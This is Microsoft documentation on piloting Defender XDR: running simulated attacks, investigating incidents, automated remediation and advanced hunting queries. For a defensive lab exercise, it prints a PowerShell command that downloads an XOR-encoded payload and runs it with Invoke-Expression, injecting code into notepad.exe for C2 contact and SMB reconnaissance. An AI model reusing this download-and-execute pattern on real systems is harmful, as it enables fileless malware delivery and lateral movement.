---
title: How do I investigate and respond using Microsoft Defender XDR?
description: How to investigate and respond to cyberattacks using Microsoft Defender XDR.
search.appverid: met150
ms.service: defender-xdr
f1.keywords: 
  - NOCSH
ms.localizationpriority: medium
ms.author: dansimp
author: dansimp
ms.date: 05/31/2024
manager: dansimp
audience: ITPro
ms.collection: 
  - m365-security
  - m365solution-scenario
  - m365solution-evalutatemtp
  - zerotrust-solution
  - highpri
  - tier1
ms.topic: conceptual
---

# Investigate and respond using Microsoft Defender XDR

**Applies to:**
- Microsoft Defender XDR

This article outlines the process to create incidents with attack simulations and tutorials and use Microsoft Defender XDR to investigate and respond. Before starting this process, be sure you've reviewed the overall process for [piloting and deploying Microsoft Defender XDR](pilot-deploy-overview.md) and you have at least piloted some of the components of Microsoft Defender XDR.

An incident in Microsoft Defender XDR is a collection of correlated alerts and associated data that make up the story of an attack. Microsoft 365 services and apps create alerts when they detect a suspicious or malicious event or activity. Individual alerts provide valuable clues about a completed or ongoing attack. However, attacks typically employ various techniques against different types of entities, such as devices, users, and mailboxes. The result is multiple alerts for multiple entities in your tenant.

> [!NOTE]
> If you are brand new to security analysis and incident response, see the [Respond to your first incident walkthrough](respond-first-incident-365-defender.md) to get a guided tour of a typical process of analysis, remediation, and post-incident review.


## End-to-end deployment for Microsoft Defender XDR

This is article 6 of 6 in a series to help you deploy the components of Microsoft Defender XDR, including investigating and responding to incidents.

:::image type="content" source="./media/eval-defender-xdr/defender-xdr-pilot-deploy-flow-investigate-respond.svg" alt-text="A diagram that shows incident investigation and response in the pilot and deploy Microsoft Defender XDR process." lightbox="./media/eval-defender-xdr/defender-xdr-pilot-deploy-flow-investigate-respond.svg" border="false":::

The articles in this series correspond to the following phases of end-to-end deployment:

| Phase | Link |
|---|---|
| A. Start the pilot | [Start the pilot](pilot-deploy-overview.md#start-the-pilot)|
| B. Pilot and deploy Microsoft Defender XDR components | - [Pilot and deploy Defender for Identity](pilot-deploy-defender-identity.md) <br><br> - [Pilot and deploy  Defender for Office 365](pilot-deploy-defender-office-365.md) <br><br> - [Pilot and deploy Defender for Endpoint](pilot-deploy-defender-endpoint.md) <br><br> - [Pilot and deploy Microsoft Defender for Cloud Apps](pilot-deploy-defender-cloud-apps.md)  |
|C. Investigate and respond to threats | **Practice incident investigation and response** (this article) |

At any time during your pilot and deployment, you can test Microsoft Defender XDR's incident response and automated investigation and remediation capabilities by creating an incident with a simulated attack and using the Microsoft Defender portal to investigate and respond.

## Workflow for incident investigation and response using Microsoft Defender XDR

Here is the workflow for investigating and responding to incidents using Microsoft Defender XDR in your production environment.

:::image type="content" source="./media/eval-defender-xdr/defender-investigate-respond-pilot-deploy-steps.svg" alt-text="A diagram that shows the steps to do incident investigation and response." lightbox="./media/eval-defender-xdr/defender-investigate-respond-pilot-deploy-steps.svg" border="false":::

Follow these steps:

1. [Simulate attacks with the Microsoft Defender portal](#step-1)
1. [Prioritize incidents](#step-2)
1. [Manage incidents](#step-3)
1. [Examine automated investigation and response with the Action center](#step-4)
1. [Use advanced hunting](#step-5)

<a name='simulate-attacks-with-the-microsoft-365-defender-portal'></a>

<a name="step-1"></a>

## Step 1. Simulate attacks with the Microsoft Defender portal

The Microsoft Defender portal has built-in capabilities to create simulated attacks on your pilot environment:

- Attack simulation training for Microsoft Defender XDR for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).

  In the Microsoft Defender portal, select **Email & collaboration > Attack simulation training**.

- Attack tutorials & simulations for Microsoft Defender XDR for Endpoint at [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  In the <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft Defender portal</a>, select **Endpoints > Tutorials & simulations**.

### Defender for Office 365 attack simulation training

Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks. The basic steps are:

1. Create a simulation

   For step by step instructions on how to create and launch a new simulation, see [Simulate a phishing attack](/defender-office-365/attack-simulation-training-simulations).

2. Create a payload

   For step by step instructions on how to create a payload for use within a simulation, see [Create a custom payload for attack simulation training](/defender-office-365/attack-simulation-training-payloads).

3. Gaining insights

   For step by step instructions on how to gain insights with reporting, see [Gain insights through attack simulation training](/defender-office-365/attack-simulation-training-insights).

   > [!VIDEO https://learn-video.azurefd.net/vod/player?id=37f13948-e44b-4d1a-ac3b-a13ce02dabec]

For more information, see [Simulations](/defender-office-365/attack-simulation-training-get-started#simulations).

### Defender for Endpoint attack tutorials & simulations

Here are the Defender for Endpoint simulations from Microsoft:

- Document drops backdoor
- Automated investigation (backdoor)

There are additional simulations from third-party sources. There is also a set of tutorials.

For each simulation or tutorial:

1. Download and read the corresponding walk-through document provided.

2. Download the simulation file. You can choose to download the file or script on the test device but it's not mandatory.

3. Run the simulation file or script on the test device as instructed in the walk-through document.

 For more information, see [Experience Microsoft Defender for Endpoint through simulated attack](/defender-endpoint/attack-simulations).

## Simulate an attack with an isolated domain controller and client device (optional)

In this optional incident response exercise, you'll simulate an attack on an isolated Active Directory Domain Services (AD DS) domain controller and Windows device using a PowerShell script and then investigate, remediate, and resolve the incident.

First, you need to add endpoints to your pilot environment.

### Add pilot environment endpoints

First, you need to add an isolated AD DS domain controller and a Windows device to your pilot environment.

1. Verify your pilot environment tenant has [enabled Microsoft Defender XDR](m365d-enable.md#confirm-that-the-service-is-on).

2. Verify that your domain controller:

   - Runs Windows Server 2008 R2 or a later version.
   - Reports to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and has enabled [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Has [Microsoft Defender for Identity and Microsoft Defender for Cloud Apps integration](/cloud-app-security/mdi-integration) enabled.
   - Has a test user is created in the test domain. Administrator-level permissions are not needed.

3. Verify that your test device:

   - Runs Windows 10 version 1903 or a later version.
   - Is joined to the AD DS domain controller domain.
   - Has [Microsoft Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) enabled. If you are having trouble enabling Microsoft Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

If you use tenant and device groups, create a dedicated device group for the test device and push it to top level.

One alternative is to host your AD DS domain controller and test device as virtual machines in Microsoft Azure infrastructure services. You can use the instructions in [Phase 1 of the simulated enterprise Test Lab Guide](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), but skip the creation of the APP1 virtual machine.

Here is the result.

:::image type="content" source="/defender/media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="A diagram of the evaluation environment using the simulated enterprise Test Lab Guide." lightbox="/defender/media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection. The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices. This category of attacks usually doesn't include files dropped on the victim's device and they occur solely in memory. They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution. Such behavior allows them to evade detection and persist on the device.

In this simulation, our sample scenario starts with a PowerShell script. In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network. Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.

:::image type="content" source="/defender/media/mtp/mtpdiydiagram.png" alt-text="A screenshot of the Fileless PowerShell attack with process injection and SMB reconnaissance attack." lightbox="/defender/media/mtp/mtpdiydiagram.png":::

During the simulation, the attack injects shellcode into a seemingly innocent process. The scenario requires the use of notepad.exe. We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe. The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed. The script attempts executing reconnaissance queries against the domain controller (DC). Reconnaissance allows an attacker to get information about recent user login information. Once attackers have this information, they can move laterally in the network to get to a specific sensitive account

> [!IMPORTANT]
> For optimum results, follow the attack simulation instructions as closely as possible.

### Run the isolated AD DS domain controller attack simulation

To run the attack scenario simulation:

1. Ensure that your pilot environment includes the isolated AD DS domain controller and Windows device.

2. Sign in to the test device with the test user account.

3. Open a Windows PowerShell window on the test device.

4. Copy the following simulation script:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
   ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
   $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. If this is the case, download this document and open it on Adobe Reader.

5. Paste and run the copied script in the PowerShell window.

> [!NOTE]
> If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work. Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.

A few seconds later, the Notepad app will open. A simulated attack code will be injected into Notepad. Keep the automatically generated Notepad instance open to experience the full scenario.

The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.

You'll see this message displayed on the PowerShell console when this script completes:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

To see the Automated Incident and Response feature in action, keep the notepad.exe process open. You'll see Automated Incident and Response stop the Notepad process.

### Investigate the incident for the simulated attack

> [!NOTE]
> Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:

> [!VIDEO https://learn-video.azurefd.net/vod/player?id=208a5393-24b6-4f17-8523-e78bdb5a34cc?]

Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft Defender portal.

1. Open the <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft Defender portal</a>.

2. From the navigation pane, select **Incidents & Alerts > Incidents**.

3. The new incident for the simulated attack will appear in the incident queue.

   :::image type="content" source="/defender/media/mtp/fig2.png" alt-text="A screenshot of an example of the Incidents queue." lightbox="/defender/media/mtp/fig2.png":::

#### Investigate the attack as a single incident

Microsoft Defender XDR correlates analytics and aggregates all related alerts and investigations from different products into one incident entity. By doing so, Microsoft Defender XDR shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.

The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.

To view the incident:

1. Open the <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft Defender portal</a>.

2. From the navigation pane, select **Incidents & Alerts > Incidents**.

3. Select the newest item by clicking on the circle located left of the incident name. A side panel displays additional information about the incident, including all the related alerts. Each incident has a unique name that describes it based on the attributes of the alerts it includes.

   The alerts that are shown in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Defender for Cloud Apps, Microsoft Defender for Endpoint, Microsoft Defender XDR, and Microsoft Defender for Office 365.

4. Select **Open incident page** to get more information about the incident.

   In the **Incident** page, you can see all the alerts and information related to the incident. The information includes the entities and assets that are involved in the alert, the detection source of the alerts (such as Microsoft Defender for Identity or Microsoft Defender for Endpoint), and the reason they were linked together. Reviewing the incident alert list shows the progression of the attack. From this view, you can see and investigate the individual alerts.

   You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.

#### Review generated alerts

Let's look at some of the alerts generated during the simulated attack.

> [!NOTE]
> We'll walk through only a few of the alerts generated during the simulated attack. Depending on the version of Windows and the Microsoft Defender XDR products running on your test device, you might see more alerts that appear in a slightly different order.

:::image type="content" source="/defender/media/mtp/fig6.png" alt-text="A screenshot of an example of a generated alert." lightbox="/defender/media/mtp/fig6.png":::

##### Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint)

Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools. One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.

To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques. The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.

:::image type="content" source="/defender/media/mtp/fig7.png" alt-text="A screenshot of an example of the alert for injection of a potentially malicious code." lightbox="/defender/media/mtp/fig7.png":::

##### Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint)

Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique. This method ensures durability and raises the bar for attackers to switch to newer tactics.

We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors. These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.

For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location. This outcome is independent of the specific method used to introduce and execute the malicious code.

> [!NOTE]
> Because this alert is based on machine learning models that require additional backend processing, it might take some time before you see this alert in the portal.

Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.

Select the IP address in the alert process tree to view the IP address details page.

:::image type="content" source="/defender/media/mtp/fig8.png" alt-text="A screenshot of an example for unexpected behavior by a process run with no command line arguments." lightbox="/defender/media/mtp/fig8.png":::

The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).

:::image type="content" source="/defender/media/mtp/fig9.png" alt-text="A screenshot of an example of the IP address details page." lightbox="/defender/media/mtp/fig9.png":::

##### Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)

Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.

In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.

:::image type="content" source="/defender/media/mtp/fig10.png" alt-text="A screenshot of an example of Microsoft Defender for Identity alert for User and IP address reconnaissance." lightbox="/defender/media/mtp/fig10.png":::

#### Review the device timeline with Microsoft Defender for Endpoint

After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier. Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.

Select the name of the device where the attack was conducted, to open the entity page for that specific device. In that page, you can see alerts that were triggered and related events.

Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.

:::image type="content" source="/defender/media/mtp/fig11.png" alt-text="A screenshot of an example of the device timeline with behaviors." lightbox="/defender/media/mtp/fig11.png":::

Expanding some of the more interesting behaviors provides useful details, such as process trees.

For example, scroll down until you find the alert event **Suspicious process injection observed**. Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane. Use the search bar for filtering if necessary.

:::image type="content" source="/defender/media/mtp/fig12.png" alt-text="A screenshot of an example of the process tree for selected PowerShell file creation behavior." lightbox="/defender/media/mtp/fig12.png":::

#### Review the user information with Microsoft Defender for Cloud Apps

On the incident page, select the **Users** tab to display the list of users involved in the attack. The table contains additional information about each user, including each user's **Investigation Priority** score.

Select the user name to open the user's profile page where further investigation can be conducted. [Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="/defender/media/mtp/fig13.png" alt-text="A screenshot of an example Defender for Cloud Apps user page." lightbox="/defender/media/mtp/fig13.png":::

#### Automated investigation and remediation

> [!NOTE]
> Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:

> [!VIDEO https://learn-video.azurefd.net/vod/player?id=340dee63-452a-4d4b-9ca3-562206a4bc23]

Navigate back to the incident in the Microsoft Defender portal. The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint. The screenshot below displays only the automated investigation triggered by Defender for Endpoint. By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.

:::image type="content" source="/defender/media/mtp/fig14.png" alt-text="A screenshot of an example of the automated investigations related to the incident." lightbox="/defender/media/mtp/fig14.png":::

Select the alert that triggered an investigation to open the **Investigation details** page. You'll see the following details:

- Alert(s) that triggered the automated investigation.
- Impacted users and devices. If indicators are found on additional devices, these additional devices will be listed as well.
- List of evidence. The entities found and analyzed, such as files, processes, services, drivers, and network addresses. These entities are analyzed for possible relationships to the alert and rated as benign or malicious.
- Threats found. Known threats that are found during the investigation.

> [!NOTE]
> Depending on timing, the automated investigation might still be running. Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results. Refresh the **Investigation details** page to get the latest findings.

:::image type="content" source="/defender/media/mtp/fig15.png" alt-text="A screenshot of an example of the Investigation details page." lightbox="/defender/media/mtp/fig15.png":::

During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation. Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.

You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.

#### Resolve the incident

After the investigation is complete and confirmed to be remediated, you resolve the incident.

From the **Incident** page, select **Manage incident**. Set the status to **Resolve incident** and select **True alert** for the classification and **Security testing** for the determination.

:::image type="content" source="/defender/media/mtp/fig16.png" alt-text="A screenshot of an example of the incidents page with the open Manage incident panel where you can click the switch to resolve incident." lightbox="/defender/media/mtp/fig16.png":::

When the incident is resolved, it resolves all of the associated alerts in the Microsoft Defender portal and the related portals.

This wraps up attack simulations for incident analysis, automated investigation, and incident resolution.

<a name="step-2"></a>

## Step 2. Prioritize incidents

You get to the incident queue from **Incidents & alerts > Incidents** on the quick launch of the <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft Defender portal</a>. Here's an example.

:::image type="content" source="/defender/media/incidents-queue/incidents-ss-incidents.png" alt-text="A screenshot of the Incidents & alerts section in the Microsoft Defender portal." lightbox="/defender/media/incidents-queue/incidents-ss-incidents.png":::

The **Most recent incidents and alerts** section shows a graph of the number of alerts received and incidents created in the last 24 hours.

To examine the list of incidents and prioritize their importance for assignment and investigation, you can: 

- Configure customizable columns (select **Choose columns**) to give you visibility into different characteristics of the incident or the impacted entities. This helps you make an informed decision regarding the prioritization of incidents for analysis.

- Use filtering to focus on a specific scenario or threat. Applying filters on the incident queue can help determine which incidents require immediate attention. 

From the default incident queue, select **Filters** to see a **Filters** pane, from which you can specify a specific set of incidents. Here's an example.

:::image type="content" source="/defender/media/incidents-queue/incidents-ss-incidents-filters.png" alt-text="A screenshot of the Filters pane of the Incidents & alerts section in the Microsoft Defender portal." lightbox="/defender/media/incidents-queue/incidents-ss-incidents-filters.png":::

For more information, see [Prioritize incidents](incident-queue.md).

<a name="step-3"></a>

## Step 3. Manage incidents

You can manage incidents from the **Manage incident** pane for an incident. Here's an example.

:::image type="content" source="/defender/media/incidents-queue/incidents-ss-incidents-manage.png" alt-text="A screenshot of the Manage incident pane of the Incidents & alerts section in the Microsoft Defender portal." lightbox="/defender/media/incidents-queue/incidents-ss-incidents-manage.png":::

You can display this pane from the **Manage incident** link on the:

- Properties pane of an incident in the incident queue.
- **Summary** page of an incident.

Here are the ways you can manage your incidents:

- Edit the incident name

  Change the automatically assigned name based on your security team best practices.
  
- Add incident tags

  Add tags that your security team uses to classify incidents, which can be later filtered.
  
- Assign the incident

  Assign it to a user account name, which can be later filtered.
  
- Resolve an incident

  Close the incident after it has been remediated.
  
- Set its classification and determination

  Classify and select the threat type when you resolve an incident.
  
- Add comments

  Use comments for progress, notes, or other information based on your security team best practices. The full comment history is available from the **Comments and history** option in the details page of an incident.

For more information, see [Manage incidents](manage-incidents.md).

<a name="step-4"></a>

## Step 4. Examine automated investigation and response with the Action center

Depending on how automated investigation and response capabilities are configured for your organization, remediation actions are taken automatically or only upon approval by your security operations team. All actions, whether pending or completed, are listed in the [Action center](m365d-action-center.md), which lists pending and completed remediation actions for your devices, email & collaboration content, and identities in one location.

Here's an example.

:::image type="content" source="/defender/media/m3d-action-center-unified.png" alt-text="A screenshot of the Unified Action center in the Microsoft Defender portal." lightbox="/defender/media/m3d-action-center-unified.png":::

From the Action center, you can select pending actions and then approve or reject them in the flyout pane. Here's an example.

:::image type="content" source="/defender/media/air-actioncenter-itemselected.png" alt-text="A screenshot of the pane displaying the options to approve or reject an action in the Microsoft Defender portal." lightbox="/defender/media/air-actioncenter-itemselected.png":::


Approve (or reject) pending actions as soon as possible so that your automated investigations can proceed and complete in a timely manner.

For more information, see [Automated investigation and response](m365d-autoir.md) and [Action center](m365d-action-center.md).

<a name="step-5"></a>

## Step 5. Use advanced hunting

> [!NOTE]
> Before we walk you through the advanced hunting simulation, watch the following video to understand advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations.

<br>

> [!VIDEO https://learn-video.azurefd.net/vod/player?id=197cbd32-a06e-4efc-ade0-0c9875d7b105]


If the [optional fileless PowerShell attack simulation](pilot-deploy-investigate-respond.md#simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional) were a real attack that had already reached the credential access stage, you can use advanced hunting at any point in the investigation to proactively search through events and records in the network using what you already know from the generated alerts and affected entities. 

For instance, based on information in the [User and IP address reconnaissance (SMB)](pilot-deploy-investigate-respond.md#alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity) alert, you can use the `IdentityDirectoryEvents` table to find all the SMB session enumeration events, or find more discovery activities in various other protocols in Microsoft Defender for Identity data using the `IdentityQueryEvents` table.


### Hunting environment requirements

There's a single internal mailbox and device required for this simulation. You'll also need an external email account to send the test message.

1. Verify that your tenant has [enabled Microsoft Defender XDR](m365d-enable.md#confirm-that-the-service-is-on).
2. Identify a target mailbox to be used for receiving email.

   - This mailbox must be monitored by Microsoft Defender for Office 365

   - The device from requirement 3 needs to access this mailbox

3. Configure a test device:

    a. Make sure you are using Windows 10 version 1903 or later version.

    b. Join the test device to the test domain.

    c. [Turn on Microsoft Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). If you are having trouble enabling Microsoft Defender Antivirus, see [this troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).

    d. [Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### Run the simulation

1. From an external email account, send an email to the mailbox identified in step 2 of the hunting environment requirements section. Include an attachment that will be allowed through any existing email filter policies. This file does not need to be malicious or an executable. Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or an Office document type such as a Word file.

2. Open the sent email from the device configured as defined in step 3 of the hunting environment requirements section. Either open the attachment or save the file to the device.

#### Go hunting

1. Open the <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft Defender portal</a>.

2. From the navigation pane, select **Hunting > Advanced hunting**.

3. Build a query that starts by gathering email events.

   1. Select **Query > New**.

   1. In the **Email** groups under **Advanced hunting**, double-click **EmailEvents**. You should see this in the query window.

      ```console
      EmailEvents
      ```

   1. Change the time frame of the query to the last 24 hours. Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame as needed.

   1. Select **Run query**. You may have differing results depending on your pilot environment.

      > [!NOTE]
      > See the next step for filtering options to limit data return.

      :::image type="content" source="/defender/media/advanced-hunting-incident-response-try-1.png" alt-text="A screenshot of the Advanced Hunting page in the Microsoft Defender portal." lightbox="/defender/media/advanced-hunting-incident-response-try-1.png":::

        > [!NOTE]
        > Advanced hunting displays query results as tabular data. You can also opt to view the data in other format types such as charts.

   1. Look at the results and see if you can identify the email you opened. It may take up to two hours for the message to show up in advanced hunting. To narrow down the results, you can add the **where** condition to your query to only look for emails that have "yahoo.com" as their SenderMailFromDomain. Here's an example.

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Click the resulting rows from the query so you can inspect the record.

      :::image type="content" source="/defender/media/advanced-hunting-incident-response-try-2.png" alt-text="A screenshot of the Inspect record section of the Advanced Hunting page in the Microsoft Defender portal." lightbox="/defender/media/advanced-hunting-incident-response-try-2.png":::

4. Now that you have verified that you can see the email, add a filter for the attachments. Focus on all emails with attachments in the environment. For this simulation, focus on inbound emails, not those that are being sent out from your environment. Remove any filters you have added to locate your message and add "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**

   The following query will show you the result with a shorter list than your initial query for all email events:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Next, include the information about the attachment (such as: file name, hashes) to your result set. To do so, join the **EmailAttachmentInfo** table. The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.

   The following query also includes an additional line "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash. The common field here will be the SHA256 hash for the attachment.

   The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored. The account name associated with the process will also be included.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   You've now created a query that'll identify all inbound emails where the user opened or saved the attachment. You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.

7. Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc. To get more details on the file, use the **FileProfile()** function enrichment:

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### Create a detection

Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.

Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose. Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.

1. On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.

   :::image type="content" source="/defender/media/advanced-hunting-incident-response-try-3.png" alt-text="A screenshot of the Query editing section of the Advanced Hunting page in the Microsoft Defender portal." lightbox="/defender/media/advanced-hunting-incident-response-try-3.png":::

   > [!NOTE]
   > If you click **Create detection rule** and you have syntax errors in your query, your detection rule won't be saved. Double-check your query to ensure there's no errors.

2. Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.

   :::image type="content" source="/defender/media/mtp/fig23.png" alt-text="A screenshot of the Alert details page in the Microsoft Defender portal." lightbox="/defender/media/mtp/fig23.png":::

   Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert

3. Select what entities are impacted in this alert. In this case, select **Device** and **Mailbox**.

   :::image type="content" source="/defender/media/mtp/fig24.png" alt-text="A screenshot of the Impacted entities details page in the Microsoft Defender portal." lightbox="/defender/media/mtp/fig24.png":::

4. Determine what actions should take place if the alert is triggered. In this case, run an antivirus scan, though other actions could be taken.

   :::image type="content" source="/defender/media/mtp/fig25.png" alt-text="A screenshot of the Actions page in the Microsoft Defender portal." lightbox="/defender/media/mtp/fig25.png":::

5. Select the scope for the alert rule. Since this query involves devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context. When creating a custom detection that does not include devices as impacted entities, scope does not apply.

   :::image type="content" source="/defender/media/mtp/fig26.png" alt-text="A screenshot of the Scope page in the Microsoft Defender portal." lightbox="/defender/media/mtp/fig26.png":::


   For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.

6. Select **Create**. Then, select **Custom detection rules** from the navigation panel.

   :::image type="content" source="/defender/media/mtp/fig27a.png" alt-text="A screenshot of the Custom detection rules rules option in the Microsoft Defender portal." lightbox="/defender/media/mtp/fig27a.png":::

   :::image type="content" source="/defender/media/mtp/fig27b.png" alt-text="A screenshot of the page displaying the detection rules and execution details in the Microsoft Defender portal." lightbox="/defender/media/mtp/fig27b.png":::

   From this page, you can select the detection rule, which will open a details page.

   :::image type="content" source="/defender/media/mtp/fig28.png" alt-text="A screenshot of the page displaying details of the triggered alerts in the Microsoft Defender portal." lightbox="/defender/media/mtp/fig28.png":::


### Expert training on advanced hunting

**Tracking the adversary** is a webcast series for new security analysts and seasoned threat hunters. It guides you through the basics of advanced hunting all the way to creating your own sophisticated queries. 

See [Get expert training on advanced hunting](advanced-hunting-expert-training.md) to get started.

## Next step

Incorporate information from [Investigate and respond with Microsoft Defender XDR](incident-response-overview.md) into your SecOps processes.
